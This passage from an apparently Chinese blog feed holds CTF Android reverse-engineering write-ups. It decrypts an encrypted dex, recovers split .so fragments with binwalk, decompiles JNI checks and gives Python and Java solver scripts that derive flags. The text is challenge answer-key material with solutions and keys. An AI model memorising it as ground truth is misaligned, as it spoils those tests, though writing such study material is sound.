class="line">        dexBuffer.position(intValue);</span><br><span class="line">        dexBuffer.put(encodeClassData);</span><br><span class="line">        dexBuffer.position(<span class="number">32</span>);</span><br><span class="line">        <span class="type">byte</span>[] bArr = <span class="keyword">new</span> <span class="title class_">byte</span>[dexBuffer.capacity() - <span class="number">32</span>];</span><br><span class="line">        dexBuffer.get(bArr);</span><br><span class="line">        <span class="type">byte</span>[] sha1 = getSha1(bArr);</span><br><span class="line">        dexBuffer.position(<span class="number">12</span>);</span><br><span class="line">        dexBuffer.put(sha1);</span><br><span class="line">        <span class="type">int</span> <span class="variable">checksum</span> <span class="operator">=</span> checksum(dexBuffer);</span><br><span class="line">        dexBuffer.position(<span class="number">8</span>);</span><br><span class="line">        dexBuffer.putInt(Integer.reverseBytes(checksum));</span><br><span class="line">        <span class="type">byte</span>[] array = dexBuffer.array();</span><br><span class="line">        <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;E:\\EDGE下载\\misc4\\assets\\1.dex&quot;</span>);<span class="comment">//你想存解密后的dex地址</span></span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fileOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(file);</span><br><span class="line">        fileOutputStream.write(array);</span><br><span class="line">        fileOutputStream.close();</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e)</span><br><span class="line">        &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>发现解密后的dex只有A类的d方法且其相关的B类的d方法也是通过加密了的</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.jsdelivr.net/gh/runwu2204/Blog_imgs/202307260255342.png"
                      alt="image-20230726025559183"
                ></p>
<p>猜测<a href="#%E9%87%8D%E7%82%B9">摁住ctrl点击 跳转</a>中的B_offset也用于解密,所以将解密exp中的main方法中三个变量变为B类的变量，方法如下</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> classIndex=<span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> index=<span class="number">3</span>;</span><br><span class="line"><span class="type">int</span> offset=<span class="number">3248</span>;</span><br><span class="line"><span class="comment">//改为</span></span><br><span class="line"><span class="type">int</span> classIndex=<span class="number">1</span>;<span class="comment">//不改的话会解密成A类的b方法，虽然结果可能没多大区别</span></span><br><span class="line"><span class="type">int</span> index=<span class="number">1</span>;</span><br><span class="line"><span class="type">int</span> offset=<span class="number">3420</span>;</span><br></pre></td></tr></table></figure></div>

<p>两个解密后的方法如下</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"> <span class="comment">//A类的方法</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">d</span><span class="params">(Context context, String password)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">signInfo</span> <span class="operator">=</span> Utils.getSignInfo(context);</span><br><span class="line">        <span class="keyword">if</span> (signInfo != <span class="literal">null</span> &amp;&amp; signInfo.equals(<span class="string">&quot;78856d5c90624ec05bbc3d9be63d3715fd6fefce&quot;</span>)) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">md5</span> <span class="operator">=</span> Utils.md5(password.getBytes());</span><br><span class="line">            <span class="keyword">if</span> (md5.equals(<span class="string">&quot;4155606cedd928c3bb0b93343c81f3f5&quot;</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;Great! please call B.d(\&quot;&quot;</span> + Utils.md5(md5.getBytes()) + <span class="string">&quot;\&quot;) to get flag&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//B类的方法</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">d</span><span class="params">(String src)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;flag&#123;ISEC-&quot;</span> + Utils.md5(Utils.getSha1(src.getBytes())) + <span class="string">&quot;&#125;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>最终flag的exp:</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.math.BigInteger;</span><br><span class="line"><span class="keyword">import</span> java.security.MessageDigest;</span><br><span class="line"><span class="keyword">import</span> java.security.NoSuchAlgorithmException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span>&#123;<span class="comment">//运行需要将左边这个类名改为跟文件名一样</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] getSha1(<span class="type">byte</span>[] data) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> MessageDigest.getInstance(<span class="string">&quot;SHA&quot;</span>).digest(data);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception unused) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">md5</span><span class="params">(<span class="type">byte</span>[] data)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">bigInteger</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BigInteger</span>(<span class="number">1</span>, MessageDigest.getInstance(<span class="string">&quot;md5&quot;</span>).digest(data)).toString(<span class="number">16</span>);</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">32</span> - bigInteger.length(); i++) &#123;</span><br><span class="line">                bigInteger = <span class="string">&quot;0&quot;</span> + bigInteger;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> bigInteger;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchAlgorithmException unused) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(<span class="string">&quot;ops!!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> </span><br><span class="line">        &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;flag&#123;ISEC-&quot;</span>+md5(getSha1(md5(<span class="string">&quot;4155606cedd928c3bb0b93343c81f3f5&quot;</span>.getBytes()).getBytes()))+<span class="string">&quot;&#125;&quot;</span>);<span class="comment">//通过网上工具sha1的时候结果有问题可能是大小写原因</span></span><br><span class="line">    </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div>

]]></content>
      <categories>
        <category>CTF WP</category>
        <category>Re</category>
        <category>安卓</category>
      </categories>
  </entry>
  <entry>
    <title>柏鹭杯 2021寻找丢失的碎片</title>
    <url>/2023/07/15/CTF%20WP/Re/%E5%AE%89%E5%8D%93/%E6%9F%8F%E9%B9%AD%E6%9D%AF%202021%E5%AF%BB%E6%89%BE%E4%B8%A2%E5%A4%B1%E7%9A%84%E7%A2%8E%E7%89%87/</url>
    <content><![CDATA[<p>直接拖进jadx，无法正常输出反编译结果</p>
<p>解压后再进行压缩为apk，就可以进行反编译了</p>
<p>只有一个activity组件</p>
<div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">manifest</span> <span class="attr">xmlns:android</span>=<span class="string">&quot;http://schemas.android.com/apk/res/android&quot;</span> <span class="attr">android:versionCode</span>=<span class="string">&quot;1&quot;</span> <span class="attr">android:versionName</span>=<span class="string">&quot;1.0&quot;</span> <span class="attr">android:compileSdkVersion</span>=<span class="string">&quot;29&quot;</span> <span class="attr">android:compileSdkVersionCodename</span>=<span class="string">&quot;10&quot;</span> <span class="attr">package</span>=<span class="string">&quot;com.example.c2&quot;</span> <span class="attr">platformBuildVersionCode</span>=<span class="string">&quot;29&quot;</span> <span class="attr">platformBuildVersionName</span>=<span class="string">&quot;10&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">uses-sdk</span> <span class="attr">android:minSdkVersion</span>=<span class="string">&quot;21&quot;</span> <span class="attr">android:targetSdkVersion</span>=<span class="string">&quot;29&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">uses-feature</span> <span class="attr">android:name</span>=<span class="string">&quot;android.hardware.sensor.accelerometer&quot;</span> <span class="attr">android:required</span>=<span class="string">&quot;true&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">application</span> <span class="attr">android:theme</span>=<span class="string">&quot;@style/AppTheme&quot;</span> <span class="attr">android:label</span>=<span class="string">&quot;@string/app_name&quot;</span> <span class="attr">android:icon</span>=<span class="string">&quot;@mipmap/ic_launcher&quot;</span> <span class="attr">android:allowBackup</span>=<span class="string">&quot;true&quot;</span> <span class="attr">android:supportsRtl</span>=<span class="string">&quot;true&quot;</span> <span class="attr">android:fullBackupContent</span>=<span class="string">&quot;false&quot;</span> <span class="attr">android:roundIcon</span>=<span class="string">&quot;@mipmap/ic_launcher_round&quot;</span> <span class="attr">android:appComponentFactory</span>=<span class="string">&quot;androidx.core.app.CoreComponentFactory&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">activity</span> <span class="attr">android:name</span>=<span class="string">&quot;com.example.p004c2.MainActivity&quot;</span> <span class="attr">android:screenOrientation</span>=<span class="string">&quot;portrait&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">&quot;android.intent.action.MAIN&quot;</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">category</span> <span class="attr">android:name</span>=<span class="string">&quot;android.intent.category.LAUNCHER&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">activity</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">application</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">manifest</span>&gt;</span></span><br></pre></td></tr></table></figure></div>



<p>主函数有点长第一步</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> <span class="type">boolean</span> <span class="title function_">loadSo</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(getFilesDir(), <span class="string">&quot;libcore.so&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (file.exists() &amp;&amp; file.isFile()) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                System.load(file.getAbsolutePath());</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (UnsatisfiedLinkError unused) &#123;</span><br><span class="line">                Log.i(<span class="string">&quot;HINT: &quot;</span>, getString(C0269R.string.no_init));</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        Log.i(<span class="string">&quot;HINT: &quot;</span>, getString(C0269R.string.noengine));</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>直接访问资源文件查看提示</p>
<div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">string</span> <span class="attr">name</span>=<span class="string">&quot;info&quot;</span>&gt;</span>APK的某个库文件被分片隐藏了起来，找到并组合成完整文件，根据提示，获取FLAG<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">string</span> <span class="attr">name</span>=<span class="string">&quot;no_init&quot;</span>&gt;</span>模块未完成初始化<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">string</span> <span class="attr">name</span>=<span class="string">&quot;noengine&quot;</span>&gt;</span>缺失某个库文件，请将组合起来的代码文件放到指定位置<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>碎片真**难找，但都可以通过binwalk工具找出来</p>
<p>第一个碎片</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">binwalk -e misc3/res/mipmap-xxxhdpi-v4/ic_launcher2.png</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.jsdelivr.net/gh/runwu2204/Blog_imgs/202307151745367.png"
                      alt="image-20230715174542325"
                ></p>
<p>第二个碎片</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">misc3/res/raw/msg.raw</span><br></pre></td></tr></table></figure></div>

<p>直接打开就行</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.jsdelivr.net/gh/runwu2204/Blog_imgs/202307151747564.png"
                      alt="image-20230715174705528"
                ></p>
<p>第三个碎片</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">binwalk -e misc3/META-INF/kotlin-elf.kotlin_module</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.jsdelivr.net/gh/runwu2204/Blog_imgs/202307151751157.png"
                      alt="image-20230715175105122"
                ></p>
<p>第四个碎片</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">binwalk -e misc3.apk #隐藏在apk安装包里</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.jsdelivr.net/gh/runwu2204/Blog_imgs/202307151751747.png"
                      alt="image-20230715175113714"
                ></p>
<p>最终，融合召唤libcore.so</p>
<p>主要函数如下</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">Java_com_example_c2_MainActivity_funcB</span><span class="params">(JNIEnv *a1, <span class="type">int</span> a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">void</span> *v4; <span class="comment">// r6</span></span><br><span class="line">  jmethodID v5; <span class="comment">// r6</span></span><br><span class="line">  <span class="type">void</span> *v6; <span class="comment">// r6</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v7; <span class="comment">// r8</span></span><br><span class="line">  <span class="type">size_t</span> v8; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">int</span> v9; <span class="comment">// r9</span></span><br><span class="line">  jstring (*NewStringUTF)(JNIEnv *, <span class="type">const</span> <span class="type">char</span> *); <span class="comment">// r2</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v11; <span class="comment">// r1</span></span><br><span class="line">  jclass v13; <span class="comment">// r6</span></span><br><span class="line">  jmethodID v14; <span class="comment">// r8</span></span><br><span class="line">  jbyteArray v15; <span class="comment">// r6</span></span><br><span class="line"></span><br><span class="line">  v4 = (<span class="type">void</span> *)((<span class="type">int</span> (__fastcall *)(JNIEnv *))(*a1)-&gt;GetObjectClass)(a1);</span><br><span class="line">  <span class="keyword">if</span> ( sub_946(a1)</span><br><span class="line">    &amp;&amp; (v5 = (*a1)-&gt;GetMethodID(a1, v4, <span class="string">&quot;funcS&quot;</span>, <span class="string">&quot;()Ljava/lang/String;&quot;</span>), sub_946(a1))</span><br><span class="line">    &amp;&amp; (v6 = (<span class="type">void</span> *)sub_968(a1, a2, v5), sub_946(a1))</span><br><span class="line">    &amp;&amp; (v7 = (*a1)-&gt;GetStringUTFChars(a1, v6, <span class="number">0</span>), sub_946(a1))</span><br><span class="line">    &amp;&amp; (v8 = _strlen_chk(<span class="string">&quot;8470096DE680B2D1D00A44ADA1ACE568&quot;</span>, <span class="number">0x21</span>u),</span><br><span class="line">        v9 = <span class="built_in">memcmp</span>(v7, <span class="string">&quot;8470096DE680B2D1D00A44ADA1ACE568&quot;</span>, v8),</span><br><span class="line">        (*a1)-&gt;ReleaseStringUTFChars(a1, v6, v7),</span><br><span class="line">        !v9) )</span><br><span class="line">  &#123;</span><br><span class="line">    v13 = (*a1)-&gt;GetObjectClass(a1, a2);</span><br><span class="line">    <span class="keyword">if</span> ( sub_946(a1) )</span><br><span class="line">    &#123;</span><br><span class="line">      v14 = (*a1)-&gt;GetMethodID(a1, v13, <span class="string">&quot;funcC&quot;</span>, <span class="string">&quot;([B)V&quot;</span>);</span><br><span class="line">      <span class="keyword">if</span> ( sub_946(a1) )</span><br><span class="line">      &#123;</span><br><span class="line">        v15 = (*a1)-&gt;NewByteArray(a1, <span class="number">32</span>);</span><br><span class="line">        <span class="keyword">if</span> ( sub_946(a1) )</span><br><span class="line">        &#123;</span><br><span class="line">          (*a1)-&gt;SetByteArrayRegion(a1, v15, <span class="number">0</span>, <span class="number">32</span>, <span class="string">&quot;dGhpcyBpcyBub3QgYSBmbGFn77yB77yB77yB&quot;</span>);</span><br><span class="line">          sub_9A0(a1, a2, v14, v15);</span><br><span class="line">          sub_946(a1);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    NewStringUTF = (*a1)-&gt;NewStringUTF;</span><br><span class="line">    v11 = (<span class="type">const</span> <span class="type">char</span> *)&amp;unk_2346;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    NewStringUTF = (*a1)-&gt;NewStringUTF;</span><br><span class="line">    v11 = (<span class="type">const</span> <span class="type">char</span> *)&amp;unk_2330;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> (<span class="type">int</span>)NewStringUTF(a1, v11);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>主要逻辑如下</p>
<pre class="mermaid">graph TB;
funcB--->|2.校验对应的hash值|funcS--->|1.传入apk的hash值|funcB-->|"3.校验成功则传入字符串的前三十位"|funcC-->|4.传入字符串的大写md5值|D0
D0-->D2
D0-->D1
D1-->|key|D3
D2-->|iv|D3
D3-->|5.AES/CBC/PKCS7Padding解密|D4

subgraph java层
    funcS
    funcC
subgraph JNI层
    funcB
end
        subgraph decryptMsg方法
            direction TB
            D0[md5字符串]
            D1[前16个字符串]
            D2[剩余的字符串]
            D3[assets中msg文件]
             D4[解密后的文件]
        end
    end</pre>

<p>解密exp:</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad, unpad</span><br><span class="line">tmp=tmp=<span class="built_in">str</span>.upper(<span class="built_in">__import__</span>(<span class="string">&quot;hashlib&quot;</span>).md5(<span class="string">&quot;dGhpcyBpcyBub3QgYSBmbGFn77yB77yB77yB&quot;</span>[:<span class="number">32</span>].encode()).hexdigest())</span><br><span class="line">password=tmp[<span class="number">0</span>:<span class="number">16</span>].encode()</span><br><span class="line">iv=tmp[<span class="number">16</span>:].encode()</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">r&#x27;./assets/msg&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> e:</span><br><span class="line">	<span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">r&#x27;./assets/dec&#x27;</span>,<span class="string">&quot;wb+&quot;</span>)<span class="keyword">as</span> d:</span><br><span class="line">		enc=e.read()</span><br><span class="line">		cipher=AES.new(password,AES.MODE_CBC,iv)</span><br><span class="line">		dec=cipher.decrypt(enc)</span><br><span class="line">		dec=unpad(dec,AES.block_size)</span><br><span class="line">		d.write(dec)</span><br></pre></td></tr></table></figure></div>

<p>解密后发现是个图片</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.jsdelivr.net/gh/runwu2204/Blog_imgs/202307151913060.png"
                      alt="image-20230715191259253"
                ></p>
<p>继续用binwalk分离，发现没有隐藏文件</p>
<p>尝试使用zsteg，获取到了提示<a class="link"   href="https://sekao.net/pixeljihad/" >PixelJihad (sekao.net) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.jsdelivr.net/gh/runwu2204/Blog_imgs/202307151917496.png"
                      alt="image-20230715191730467"
                ></p>
<p>上传后，得到了flag</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.jsdelivr.net/gh/runwu2204/Blog_imgs/202307151917913.png"
                      alt="image-20230715191754833"
                ></p>
]]></content>
      <categories>
        <category>CTF WP</category>
        <category>Re</category>
        <category>安卓</category>
      </categories>
  </entry>
  <entry>
    <title>柏鹭杯 2021重要信息还原</title>
    <url>/2023/07/13/CTF%20WP/Re/%E5%AE%89%E5%8D%93/%E6%9F%8F%E9%B9%AD%E6%9D%AF%202021%E9%87%8D%E8%A6%81%E4%BF%A1%E6%81%AF%E8%BF%98%E5%8E%9F/</url>
    <content><![CDATA[<p>给了两个文件夹，一个是源码一个是编译后的文件</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.jsdelivr.net/gh/runwu2204/Blog_imgs/202307132055371.png"
                      alt="image-20230713205556346"
                ></p>
<p>可以直接将resources压缩包打包为apk然后丢进jadx(apk本质就是压缩包)</p>
<div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">manifest</span> <span class="attr">xmlns:android</span>=<span class="string">&quot;http://schemas.android.com/apk/res/android&quot;</span> <span class="attr">android:versionCode</span>=<span class="string">&quot;1&quot;</span> <span class="attr">android:versionName</span>=<span class="string">&quot;1.0&quot;</span> <span class="attr">android:compileSdkVersion</span>=<span class="string">&quot;29&quot;</span> <span class="attr">android:compileSdkVersionCodename</span>=<span class="string">&quot;10&quot;</span> <span class="attr">package</span>=<span class="string">&quot;com.example.c1&quot;</span> <span class="attr">platformBuildVersionCode</span>=<span class="string">&quot;29&quot;</span> <span class="attr">platformBuildVersionName</span>=<span class="string">&quot;10&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">uses-sdk</span> <span class="attr">android:minSdkVersion</span>=<span class="string">&quot;21&quot;</span> <span class="attr">android:targetSdkVersion</span>=<span class="string">&quot;29&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.WRITE_EXTERNAL_STORAGE&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.READ_EXTERNAL_STORAGE&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">application</span> <span class="attr">android:theme</span>=<span class="string">&quot;@style/AppTheme&quot;</span> <span class="attr">android:label</span>=<span class="string">&quot;@string/app_name&quot;</span> <span class="attr">android:icon</span>=<span class="string">&quot;@mipmap/ic_launcher&quot;</span> <span class="attr">android:allowBackup</span>=<span class="string">&quot;false&quot;</span> <span class="attr">android:supportsRtl</span>=<span class="string">&quot;true&quot;</span> <span class="attr">android:fullBackupContent</span>=<span class="string">&quot;false&quot;</span> <span class="attr">android:roundIcon</span>=<span class="string">&quot;@mipmap/ic_launcher_round&quot;</span> <span class="attr">android:appComponentFactory</span>=<span class="string">&quot;androidx.core.app.CoreComponentFactory&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">activity</span> <span class="attr">android:name</span>=<span class="string">&quot;com.example.c1.MainActivity&quot;</span> <span class="attr">android:screenOrientation</span>=<span class="string">&quot;portrait&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">&quot;android.intent.action.MAIN&quot;</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">category</span> <span class="attr">android:name</span>=<span class="string">&quot;android.intent.category.LAUNCHER&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">activity</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">application</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">manifest</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>只有一个activity</p>
<p>其主要逻辑流程如下</p>
<pre class="mermaid">graph TB;
    C0-->|1.传入flag| B1;
    B1-->|2.传入flag|C1;
    C1-->|3.调用|B2;
    B2-->|4.传入key|C1;
    C1-->|5.返回RSA加密结果|B1
    B1-->|6.传入RSA加密结果|C2;
    C2-->|7.MD5后的字符串|B1
    B1-->|8.MD5后的字符串|D0
    D0-->D1
    D0-->D2
    D1-->|前16个作为AES密钥|D3
    D2-->|后面的字符串作偏移|D3
    D3-->|9.AES/CBC/PKCS7Padding解密|D4
    subgraph java层
        direction TB
        C0[onClickCheck]
        subgraph JNI层
        direction TB
        B1[JNI-b] 
        B2[JNI-a]
        C1[java-funcB]
        C2[java-funcA]
    end
        subgraph decryptMsg方法
        direction TB
        D0[字符串]
        D1[前16个字符串]
        D2[剩余的字符串]
        D3[assets中enc文件]
        D4[解密后的文件]
        end
    end</pre>

<h1 id="解密文件"><a href="#解密文件" class="headerlink" title="解密文件"></a>解密文件</h1><h2 id="RSA"><a href="#RSA" class="headerlink" title="RSA"></a>RSA</h2><p>可以通过JNI中的a函数获取公钥</p>
<p>公钥格式</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">-----BEGIN PUBLIC KEY-----</span><br><span class="line">MFwwDQYJKoZIhvcNAQEBBQADSwAwSAJBAJgby/H1lmzAIGjC3NczfQEWl5e3gR2VDukg9Wm+UopVUgXbj9O4+YSMZ0brftk2Qkr8GHJU8a8YqK2DNFg2XD8CAwEAAQ==</span><br><span class="line">-----END PUBLIC KEY-----</span><br></pre></td></tr></table></figure></div>

<p>私钥格式</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">-----BEGIN PRIVATE KEY-----</span><br><span class="line"></span><br><span class="line">-----END PRIVATE KEY-----</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.jsdelivr.net/gh/runwu2204/Blog_imgs/202307132059100.png"
                      alt="image-20230713205917019"
                ></p>
<p>根据题目在JNI b函数中的提示</p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line">__android_log_print(<span class="number">4</span>, <span class="string">&quot;HINT:&quot;</span>, <span class="string">&quot;http://www.factordb.com/&quot;</span>);</span><br></pre></td></tr></table></figure></div>

<p>可以通过该网站<a class="link"   href="http://www.factordb.com/index.php" >factordb.com <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>分解出p和q，最后根据rsa的算法可以算出解密密钥d</p>
<p>注意此处是分组加密算法，需要将密文分成多组，原来我自己直接解密不知道是分组加密，卡了很久</p>
<h2 id="AES"><a href="#AES" class="headerlink" title="AES"></a>AES</h2><p>根据apk中的decryptMsg方法可以知道其获取的apk中funcA进行md5后的字符串(32字节,大写)</p>
